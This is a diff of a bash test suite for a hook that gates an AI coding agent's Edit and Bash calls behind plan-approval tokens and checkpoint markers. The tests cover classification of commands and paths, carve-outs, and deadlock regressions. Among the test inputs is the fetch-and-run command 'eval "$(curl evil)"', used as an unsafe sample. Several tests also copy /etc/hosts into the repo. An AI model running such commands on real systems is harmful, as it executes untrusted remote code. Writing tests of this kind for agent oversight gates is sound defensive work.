   "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
+
+# (2) Approved implementation — first repo-source Edit arms + blocks + consumes token
+reset_pp
+seed_approval "$PP_MARKER_DIR" "$PP_SID_A"
+assert_blocked "PP-5. first in-repo Edit (approved) blocks at implementation boundary" \
+  "$(mock_pp_edit "$PP_REPO/scripts/foo.mjs" "$PP_SID_A")" "Checkpoint required"
+assert_marker_exists "PP-6. first in-repo Edit (approved) armed .checkpoint-required.<sidA>" \
+  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
+assert_marker_absent "PP-6b. arm consumed the approval token .plan-approved.<sidA>" \
+  "$PP_MARKER_DIR/.plan-approved.$PP_SID_A"
 
 # (3) After the session's pre-checkpoint is written → Edit allowed + post armed
 echo "Rule 18 pre-checkpoint" > "$PP_MARKER_DIR/.pre-checkpoint-done.$PP_SID_A"
@@ -1834,6 +1887,8 @@ rm -rf "$OFFREPO_PP"
 
 # (5) Multisession — two sids arm independently; one's pre-done doesn't unblock the other
 reset_pp
+seed_approval "$PP_MARKER_DIR" "$PP_SID_A"
+seed_approval "$PP_MARKER_DIR" "$PP_SID_B"
 echo "$(mock_pp_edit "$PP_REPO/scripts/a.mjs" "$PP_SID_A")" | run_hook >/dev/null 2>&1
 echo "$(mock_pp_edit "$PP_REPO/scripts/b.mjs" "$PP_SID_B")" | run_hook >/dev/null 2>&1
 assert_marker_exists "PP-11. session A armed its own .checkpoint-required.<sidA>" \
@@ -1848,6 +1903,7 @@ assert_blocked "PP-14. session B still blocked (independent pre-done)" \
 
 # (6) Multiproject — edit in repo A never arms repo B
 reset_pp
+seed_approval "$PP_MARKER_DIR" "$PP_SID_A"
 PP_REPO_B="$(mktemp -d)"; PP_REPO_B="$(cd -P "$PP_REPO_B" && pwd)"
 git -C "$PP_REPO_B" init -q 2>/dev/null
 mkdir -p "$PP_REPO_B/.checkpoints"
@@ -1879,6 +1935,372 @@ else
   echo "  ✓ #349. spaced classifier-marker path processed cleanly (de-quote extraction)"; ((passed++))
 fi
 rm -rf "$F1_SPACE_BASE"
+
+# ============================================================================
+echo ""
+echo "--- PR-B2 (#351): Bash nonsrc_write free-flow + shared_write arm + 3-way hint ---"
+# ============================================================================
+# nonsrc_write Bash (git metadata, package installs, dir ops, em-store) flows
+# FREE — never arms the pre-checkpoint (the inversion: only repo-source /
+# can't-tell writes arm).
+reset_state
+assert_allowed "B2-1. git commit (nonsrc_write) allowed in idle" \
+  "$(mock_json 'Bash' 'git commit -m wip')"
+assert_allowed "B2-2. npm install (nonsrc_write) allowed in idle" \
+  "$(mock_json 'Bash' 'npm install')"
+assert_allowed "B2-3. mkdir (nonsrc_write) allowed in idle" \
+  "$(mock_json 'Bash' 'mkdir -p src/new')"
+assert_allowed "B2-4. node em-store (nonsrc_write) allowed in idle" \
+  "$(mock_json 'Bash' 'node scripts/em-store.mjs --project x')"
+assert_marker_absent "B2-5. no nonsrc_write command armed .checkpoint-required" "$PRE_REQ"
+
+# Agent-classifier-first (2026-05-26, user design decision): an UNEVALUATED novel
+# command — the classifier's conservative cache-miss defaults (default_write /
+# interpreter_other) — is HELD for agent classification (block + 3-way hint) but
+# does NOT arm .checkpoint-required. The block is the fail-closed mechanism; arming
+# is deferred to the agent verdict. (Was: arms + blocks — that framed read-only
+# inspection like `shasum` as implementation and left a lingering marker that
+# deadlocked the stop-gate.)
+reset_state
+assert_blocked "B2-6. novel shared_write Bash (cp, default_write) blocks (held for classification)" \
+  "$(mock_json 'Bash' 'cp /etc/hosts scripts/x.txt')" "Classify it ONCE"
+assert_marker_absent "B2-7. novel shared_write Bash did NOT arm .checkpoint-required (agent-classifier-first)" "$PRE_REQ"
+# interpreter_other (a non-allowlisted node script) is the SAME unevaluated-novel
+# class — also held, also no arm. This is the canonical node-script friction.
+reset_state
+assert_blocked "B2-7c. novel interpreter_other Bash (node foo.mjs) blocks (held)" \
+  "$(mock_json 'Bash' 'node scripts/foo.mjs --run')" "Classify it ONCE"
+assert_marker_absent "B2-7d. novel interpreter_other Bash did NOT arm" "$PRE_REQ"
+# Boundary guard: a RECOGNIZED write reason (allowlisted cmd + redirect →
+# readonly_cmd_redirected) is NOT unevaluated-novel and STILL arms conservatively
+# — but ONLY when a plan is approved (planapproval redesign). Seed the token.
+reset_state
+B2_SID="55555555-eeee-4eee-8eee-555555555555"
+seed_approval "$MARKER_DIR" "$B2_SID"
+assert_blocked "B2-7e. recognized write (cat redirect, approved) arms + blocks" \
+  "$(jq -n --arg cmd 'cat /etc/hosts > scripts/x.txt' --arg cwd "$TEST_DIR" --arg sid "$B2_SID" \
+    '{tool_name:"Bash", tool_input:{command:$cmd}, cwd:$cwd, session_id:$sid}')" "Checkpoint required"
+assert_marker_exists "B2-7f. recognized write (cat redirect, approved) DID arm .checkpoint-required.<sid>" \
+  "$MARKER_DIR/.checkpoint-required.$B2_SID"
+# Negative control: same recognized write WITHOUT an approval token is planning → allowed, no arm.
+reset_state
+assert_allowed "B2-7g. recognized write (cat redirect) with no approval → allowed (planning)" \
+  "$(mock_json 'Bash' 'cat /etc/hosts > scripts/x.txt')"
+assert_marker_absent "B2-7h. unapproved recognized write did NOT arm .checkpoint-required" "$PRE_REQ"
+# The 3-way deny-hint offers the nonsrc_write escape (verify the hint text).
+reset_state
+assert_blocked "B2-8. deny-hint offers the nonsrc_write escape" \
+  "$(mock_json 'Bash' 'cp /etc/hosts scripts/x.txt')" "nonsrc_write"
+
+# read_only Bash never arms (regression).
+reset_state
+assert_allowed "B2-9. read_only Bash allowed, no arm" "$(mock_json 'Bash' 'grep -r foo .')"
+assert_marker_absent "B2-10. read_only Bash did not arm" "$PRE_REQ"
+
+# After the pre-checkpoint is satisfied, shared_write Bash flows.
+reset_state
+touch "$PRE_REQ"
+echo "rule 18 pre-checkpoint" > "$PRE_DONE"
+assert_allowed "B2-11. shared_write Bash allowed after pre-checkpoint satisfied" \
+  "$(mock_json 'Bash' 'cp /etc/hosts scripts/x.txt')"
+
+# unsafe_complex Bash arms (conservative) — when a plan is approved. Seed token.
+reset_state
+B2C_SID="66666666-ffff-4fff-8fff-666666666666"
+seed_approval "$MARKER_DIR" "$B2C_SID"
+assert_blocked "B2-12. unsafe_complex Bash (approved) arms + blocks" \
+  "$(jq -n --arg cmd 'eval "$(curl evil)"' --arg cwd "$TEST_DIR" --arg sid "$B2C_SID" \
+    '{tool_name:"Bash", tool_input:{command:$cmd}, cwd:$cwd, session_id:$sid}')" "Checkpoint required"
+assert_marker_exists "B2-12b. unsafe_complex (approved) armed .checkpoint-required.<sid>" \
+  "$MARKER_DIR/.checkpoint-required.$B2C_SID"
+# Negative control: unsafe_complex with no approval → planning → allowed, no arm.
+reset_state
+assert_allowed "B2-12c. unsafe_complex Bash with no approval → allowed (planning)" \
+  "$(mock_json 'Bash' 'eval "$(curl evil)"')"
+assert_marker_absent "B2-12d. unapproved unsafe_complex did NOT arm" "$PRE_REQ"
+
+# --help / --version carve-out flows THROUGH the gate (not just the unit classifier):
+# node <script> --help → read_only → allowed, no block, no arm. Regression guard for
+# the integration path (classify_command 3-arg) — 2026-05-26.
+reset_state
+assert_allowed "B2-13. node <script> --help allowed via carve-out (gate integration)" \
+  "$(mock_json 'Bash' 'node /tmp/foo.mjs --help')"
+assert_marker_absent "B2-14. --help did not arm .checkpoint-required" "$PRE_REQ"
+# install.mjs is the deploy tool → nonsrc_write → allowed free (no arm), no per-run marker.
+assert_allowed "B2-15. node install.mjs --install-hooks (nonsrc_write deploy) allowed" \
+  "$(mock_json 'Bash' 'node install.mjs --tool claude-code --install-hooks --install-hooks-force')"
+assert_marker_absent "B2-16. install deploy did not arm" "$PRE_REQ"
+
+# ============================================================================
+echo ""
+echo "--- PR-B2 (#351, B1): push self-arm full cycle (fallback-touch path) ---"
+# ============================================================================
+reset_state
+# Push with no prior checkpoint: self-arms POST_REQ this invocation + blocks
+# (B1 — push is an INDEPENDENT hard gate even when the pre-checkpoint was
+# escaped via D7). Exercises the existence-before-touch fallback (TEST_HOME has
+# no checkpoint-marker.mjs helper). The noop-parse helper path is an impl/code-
+# review-tier two-process repro (§15-C3).
+assert_blocked "B1-1. push self-arms + blocks (no prior checkpoint)" \
+  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"
+assert_marker_exists "B1-2. push self-armed .post-checkpoint-required" "$POST_REQ"
+# Write the post-checkpoint, then the push is allowed + sweeps markers.
+echo "e2e done" > "$POST_DONE"
+assert_allowed "B1-3. push allowed after post-checkpoint written" \
+  "$(mock_json 'Bash' 'git push origin main')"
+assert_marker_absent "B1-4. allowed push swept .post-checkpoint-required" "$POST_REQ"
+assert_marker_absent "B1-5. allowed push swept .post-checkpoint-done" "$POST_DONE"
+
+# ============================================================================
+echo ""
+echo "--- PR-B2 S3 (#351, §11): Edit/Write path verdict + .review-store carve-out ---"
+# ============================================================================
+# The Edit/Write pre-gate was a pure path heuristic (any in-repo write armed),
+# which over-arms on plan/scratch/doc files cross-tool harnesses stage in-repo.
+# S3 lets the agent downgrade a specific TARGET path to nonsrc_write/read_only
+# via `classifier-marker.mjs --target-path`; the gate consults the verdict in
+# _tool_call_targets_repo_source.
+#
+# CRITICAL setup: the NC carve-out tests above `touch` an EMPTY stub at
+# $TEST_HOME/.episodic-memory/scripts/classifier-marker.mjs. agent_classify_path
+# resolves the global helper first, so under that polluted HOME the gate would
+# read the empty stub (miss → never downgrade). Use a FRESH clean HOME for the
+# PV section so the gate resolves the real repo-source (v2) helper — the same
+# one write_path_verdict uses — and the canonical path key round-trips.
+PV_PREV_HOME="$TEST_HOME"
+TEST_HOME="$(mktemp -d)"
+TEST_HOME="$(cd -P "$TEST_HOME" && pwd)"
+trap 'cleanup; rm -rf "$PV_PREV_HOME"' EXIT
+
+PV_SID="pvsid-s3-$$"
+REPO_MARKER="$REPO_ROOT/scripts/classifier-marker.mjs"
+PV_TARGET="$TEST_DIR/scripts/generated.mjs"
+# A session_id'd call arms the session-namespaced marker (touch fallback — the
+# clean HOME has no checkpoint-marker.mjs helper), not the legacy literal.
+PV_PRE_REQ="$MARKER_DIR/.checkpoint-required.$PV_SID"
+
+# Edit tool JSON carrying a session_id, so the gate threads a stable
+# CLAUDE_CODE_SESSION_ID to agent_classify_path.
+pv_edit_json() {
+  jq -n --arg fp "$1" --arg cwd "$TEST_DIR" --arg sid "$PV_SID" \
+    '{tool_name: "Edit", tool_input: {file_path: $fp}, cwd: $cwd, session_id: $sid}'
+}
+
+# Write a path verdict for <target> with <label> under PV_SID (the session the
+# gate reads). From TEST_DIR so the helper cross-repo check passes;
+# CLAUDE_CODE_SESSION_ID empty so it doesn't conflict with --session-id.
+write_path_verdict() {
+  ( cd "$TEST_DIR" && CLAUDE_CODE_SESSION_ID="" \
+      node "$REPO_MARKER" --write \
+      --project-root "$TEST_DIR" --caller-cwd "$TEST_DIR" \
+      --target-path "$1" --session-id "$PV_SID" \
+      --label "$2" --confidence 0.9 --reason "s3 test verdict" >/dev/null 2>&1 )
+}
+
+# PV-1/2: no verdict + in-repo target + APPROVED plan → block WITH the 2-way path
+# hint, and arm (planapproval redesign: arming requires the approval token).
+reset_state
+seed_approval "$MARKER_DIR" "$PV_SID"
+assert_blocked "PV-1. in-repo Edit (approved), no path verdict → block with 2-way path hint" \
+  "$(pv_edit_json "$PV_TARGET")" "nonsrc_write"
+assert_marker_exists "PV-2. PV-1 armed .checkpoint-required (session-namespaced)" "$PV_PRE_REQ"
+# Negative control: same edit with NO approval token → planning → allowed, no arm.
+reset_state
+assert_allowed "PV-2b. in-repo Edit with no approval → allowed (planning)" \
+  "$(pv_edit_json "$PV_TARGET")"
+assert_marker_absent "PV-2c. unapproved in-repo Edit did NOT arm" "$PV_PRE_REQ"
+
+# PV-3/4: nonsrc_write path verdict → Edit downgraded → ALLOWED, no arm.
+reset_state
+write_path_verdict "$PV_TARGET" "nonsrc_write"
+assert_allowed "PV-3. nonsrc_write path verdict → Edit allowed (downgrade)" \
+  "$(pv_edit_json "$PV_TARGET")"
+assert_marker_absent "PV-4. PV-3 did NOT arm .checkpoint-required" "$PV_PRE_REQ"
+
+# PV-5/6: read_only path verdict also downgrades.
+reset_state
+write_path_verdict "$PV_TARGET" "read_only"
+assert_allowed "PV-5. read_only path verdict → Edit allowed (downgrade)" \
+  "$(pv_edit_json "$PV_TARGET")"
+assert_marker_absent "PV-6. PV-5 did NOT arm" "$PV_PRE_REQ"
+
+# PV-7: shared_write verdict must NOT downgrade (only nonsrc_write/read_only do).
+# Approved plan seeded so the non-downgraded edit reaches the arm + block.
+reset_state
+seed_approval "$MARKER_DIR" "$PV_SID"
+write_path_verdict "$PV_TARGET" "shared_write"
+assert_blocked "PV-7. shared_write path verdict (approved) does NOT downgrade → block" \
+  "$(pv_edit_json "$PV_TARGET")" "Checkpoint required"
+
+# PV-8: verdict for a DIFFERENT path does not downgrade THIS target (specificity).
+reset_state
+seed_approval "$MARKER_DIR" "$PV_SID"
+write_path_verdict "$TEST_DIR/scripts/other.mjs" "nonsrc_write"
+assert_blocked "PV-8. verdict specificity (approved): other path's verdict → this target still blocks" \
+  "$(pv_edit_json "$PV_TARGET")" "Checkpoint required"
+
+# PV-9/10: .review-store/ carve-out — review artifacts never arm, no verdict needed.
+reset_state
+assert_allowed "PV-9. .review-store/ target → allowed (carve-out)" \
+  "$(pv_edit_json "$TEST_DIR/.review-store/codex/req-123.md")"
+assert_marker_absent "PV-10. .review-store/ did NOT arm" "$PV_PRE_REQ"
+
+# ============================================================================
+echo "--- Non-source write carve-outs (#354 FU): .checkpoints/ + .gitignore ---"
+# ============================================================================
+# 2026-05-27 (user-directed): writes to non-source paths must NOT arm the Rule 18
+# pre-checkpoint. The command-classification deny-hint itself instructs the agent
+# to Write <repo>/.checkpoints/classify/pending-*.cmd; arming on that deadlocked
+# the classify protocol (reproduced this session). Generalized to anything
+# git-ignored (episodes under .episodic-memory/, scratch/, etc.) so the gate
+# defers to git's notion of source instead of an enumerated directory list.
+
+# PV-11/12: .checkpoints/classify/pending-*.cmd → allowed via (1b), no arm.
+# This is the exact deadlock the deny-hint's prescribed write hit.
+reset_state
+assert_allowed "PV-11. .checkpoints/classify/pending-*.cmd → allowed (.checkpoints carve-out)" \
+  "$(pv_edit_json "$TEST_DIR/.checkpoints/classify/pending-deadbeef.cmd")"
+assert_marker_absent "PV-12. PV-11 did NOT arm" "$PV_PRE_REQ"
+
+# The (1c) gitignore carve-out needs a real .gitignore in the test repo (git
+# init'd clean above). Create it now — it only affects the tests below.
+printf '%s\n' '.episodic-memory/' 'scratch/' 'analysis/' > "$TEST_DIR/.gitignore"
+
+# PV-13/14: .episodic-memory/ episode write → allowed via (1c gitignore), no arm.
+reset_state
+assert_allowed "PV-13. .episodic-memory/ episode write → allowed (gitignore carve-out)" \
+  "$(pv_edit_json "$TEST_DIR/.episodic-memory/episodes/ep-1.json")"
+assert_marker_absent "PV-14. PV-13 did NOT arm" "$PV_PRE_REQ"
+
+# PV-15/16: an arbitrary gitignored scratch path → allowed (proves the general
+# mechanism, not just episodes/.checkpoints).
+reset_state
+assert_allowed "PV-15. gitignored scratch/ path → allowed (gitignore carve-out)" \
+  "$(pv_edit_json "$TEST_DIR/scratch/draft-plan.md")"
+assert_marker_absent "PV-16. PV-15 did NOT arm" "$PV_PRE_REQ"
+
+# PV-17/18: NEGATIVE CONTROL — a tracked, NON-ignored source file (with .gitignore
+# now present) must STILL arm + block under an approved plan. Proves git
+# check-ignore returns "not ignored" for real source and the carve-outs did not
+# over-broaden.
+reset_state
+seed_approval "$MARKER_DIR" "$PV_SID"
+assert_blocked "PV-17. tracked source file (approved, not ignored) → still blocks" \
+  "$(pv_edit_json "$TEST_DIR/hooks/checkpoint-gate.sh")" "Checkpoint required"
+assert_marker_exists "PV-18. PV-17 still armed .checkpoint-required" "$PV_PRE_REQ"
+
+# ============================================================================
+echo ""
+echo "--- Deadlock-combo regression (planapproval, 2026-05-27) ---"
+# ============================================================================
+# Root cause being fixed: a PLANNING session that wrote .pre-checkpoint-done /
+# .post-checkpoint-done as gate bookkeeping armed .checkpoint-required via the
+# old file-write heuristic. The stop-gate (em-recall.mjs --gate stop) then
+# blocked turn-end because .checkpoint-required was armed with no
+# .post-checkpoint-done — and the post-done write was itself refused because
+# .post-checkpoint-required was never armed → DEADLOCK during planning.
+#
+# The fix anchors arming to the approval token: NO approval ⇒ no arm ⇒ no
+# lingering .checkpoint-required ⇒ the stop-gate never trips. These tests assert
+# the checkpoint-gate side of that invariant (the marker the stop-gate keys on
+# is never created during planning), the approved lifecycle still arms, and the
+# token consume is prefix-collision safe.
+
+# DL-1/2: THE deadlock root — planning writes .pre-checkpoint-done with NO
+# approval. The marker write is allowed, but it must NOT arm .checkpoint-required
+# (under the OLD heuristic this arm is exactly what deadlocked the stop-gate).
+reset_state
+DL_SID="bbbbbbbb-2222-4222-8222-bbbbbbbbbbbb"
+assert_allowed "DL-1. planning writes .pre-checkpoint-done (no approval) → allowed (marker write)" \
+  "$(jq -n --arg cmd "echo 'planning bookkeeping' > $MARKER_DIR/.pre-checkpoint-done.$DL_SID" \
+    --arg cwd "$TEST_DIR" --arg sid "$DL_SID" \
+    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"
+assert_marker_absent "DL-2. planning pre-done write did NOT arm .checkpoint-required.<sid> (deadlock root fixed)" \
+  "$MARKER_DIR/.checkpoint-required.$DL_SID"
+assert_marker_absent "DL-2b. nor the legacy .checkpoint-required literal" \
+  "$MARKER_DIR/.checkpoint-required"
+
+# DL-3: planning attempts a premature .post-checkpoint-done write (no approval,
+# no .post-checkpoint-required) — still blocked (can't fake a post-checkpoint),
+# and crucially leaves NO armed .checkpoint-required behind.
+reset_state
+assert_blocked "DL-3. planning premature post-done write blocked (no post-required)" \
+  "$(jq -n --arg cmd "echo 'x' > $MARKER_DIR/.post-checkpoint-done.$DL_SID" \
+    --arg cwd "$TEST_DIR" --arg sid "$DL_SID" \
+    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"
+assert_marker_absent "DL-4. premature post-done attempt did NOT arm .checkpoint-required.<sid>" \
+  "$MARKER_DIR/.checkpoint-required.$DL_SID"
+
+# DL-5: approved lifecycle — the SAME pre-done write, but WITH an approval token,
+# DOES keep a real checkpoint. Edit arms+consumes; then the pre-done write is the
+# normal implementation flow. Contrast with DL-1/2 (planning).
+reset_state
+DL_SID_OK="cccccccc-3333-4333-8333-cccccccccccc"
+seed_approval "$MARKER_DIR" "$DL_SID_OK"
+echo "$(jq -n --arg fp "$TEST_DIR/scripts/impl.mjs" --arg cwd "$TEST_DIR" --arg sid "$DL_SID_OK" \
+  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | run_hook >/dev/null 2>&1
+assert_marker_exists "DL-5. approved in-repo Edit armed .checkpoint-required.<sid>" \
+  "$MARKER_DIR/.checkpoint-required.$DL_SID_OK"
+assert_marker_absent "DL-6. arm consumed the approval token (one-shot)" \
+  "$MARKER_DIR/.plan-approved.$DL_SID_OK"
+
+# DL-7/8: gate-side consume is prefix-collision safe (codex R2 P1 — sid=X must
+# not clobber a sibling whose name starts with X). Seed approval for DL_SID_OK2
+# AND a sibling file `.plan-approved.<DL_SID_OK2>-sib`; arming for DL_SID_OK2
+# must remove ONLY the exact token, leaving the sibling intact.
+reset_state
+DL_SID_OK2="dddddddd-4444-4444-8444-dddddddddddd"
+seed_approval "$MARKER_DIR" "$DL_SID_OK2"
+: > "$MARKER_DIR/.plan-approved.${DL_SID_OK2}-sib"
+echo "$(jq -n --arg fp "$TEST_DIR/scripts/impl2.mjs" --arg cwd "$TEST_DIR" --arg sid "$DL_SID_OK2" \
+  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | run_hook >/dev/null 2>&1
+assert_marker_absent "DL-7. consume removed the EXACT approval token .plan-approved.<sid>" \
+  "$MARKER_DIR/.plan-approved.$DL_SID_OK2"
+assert_marker_exists "DL-8. consume did NOT clobber prefix-collision sibling .plan-approved.<sid>-sib" \
+  "$MARKER_DIR/.plan-approved.${DL_SID_OK2}-sib"
+
+# DL-9/10: review F1 regression — a CONCURRENT session's live .plan-approved
+# token must SURVIVE another session's push sweep. `.plan-approved` is
+# deliberately excluded from CHECKPOINT_CLEANUP_MARKERS so the push glob
+# (`<marker>.*`, all sessions) does NOT delete it — otherwise session B would
+# silently skip its pre-checkpoint after session A pushes. The quartet IS still
+# swept (convergence semantics preserved).
+reset_state
+DL_SID_B="eeeeeeee-5555-4555-8555-eeeeeeeeeeee"
+: > "$MARKER_DIR/.plan-approved.$DL_SID_B"     # session B's live approval token (pre-arm)
+touch "$POST_REQ"                               # session A's post-checkpoint armed
+echo "e2e done" > "$POST_DONE"                  # and satisfied → push is allowed → cleanup runs
+echo "$(mock_json 'Bash' 'git push origin main')" | run_hook >/dev/null 2>&1   # allowed push → cleanup sweep
+assert_marker_exists "DL-9. concurrent session's .plan-approved token SURVIVED another session's push sweep (F1)" \
+  "$MARKER_DIR/.plan-approved.$DL_SID_B"
+assert_marker_absent "DL-10. push sweep still cleared the satisfied quartet (.post-checkpoint-done) — convergence intact" \
+  "$POST_DONE"
+
+# DL-11/12/13: codex PR-review P1 regression — a FAILING installed arm helper
+# must NOT consume the approval token while leaving the write ungated. The
+# arm/consume is transactional: if `checkpoint-marker.mjs` exits non-zero (no
+# .checkpoint-required created), the token is PRESERVED and the write fails
+# CLOSED (still blocked), so a retry can arm. (Was: `|| true` swallowed the
+# failure, consume ran unconditionally → token gone + no checkpoint + write
+# ALLOWED ungated.)
+reset_state
+DL_FAIL_HOME=$(mktemp -d)
+mkdir -p "$DL_FAIL_HOME/.episodic-memory/scripts"
+printf '#!/usr/bin/env node\nprocess.exit(1)\n' > "$DL_FAIL_HOME/.episodic-memory/scripts/checkpoint-marker.mjs"
+DL_FAIL_SID="ffffffff-6666-4666-8666-ffffffffffff"
+seed_approval "$MARKER_DIR" "$DL_FAIL_SID"
+DL_FAIL_OUT=$(echo "$(jq -n --arg fp "$TEST_DIR/scripts/x.mjs" --arg cwd "$TEST_DIR" --arg sid "$DL_FAIL_SID" \
+  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | HOME="$DL_FAIL_HOME" bash "$HOOK" 2>/dev/null)
+if echo "$DL_FAIL_OUT" | grep -q '"decision".*"block"'; then
+  echo "  ✓ DL-11. failed arm helper → write FAILS CLOSED (still blocked, not allowed ungated)"; ((passed++))
+else
+  echo "  ✗ DL-11. failed arm helper → expected block, got: $DL_FAIL_OUT"; ((failed++))
+fi
+assert_marker_absent "DL-12. failed arm did NOT create .checkpoint-required.<sid>" \
+  "$MARKER_DIR/.checkpoint-required.$DL_FAIL_SID"
+assert_marker_exists "DL-13. failed arm PRESERVED the approval token (not consumed — retry can arm)" \
+  "$MARKER_DIR/.plan-approved.$DL_FAIL_SID"
+rm -rf "$DL_FAIL_HOME"
 
 echo ""
 echo "Passed: $passed"
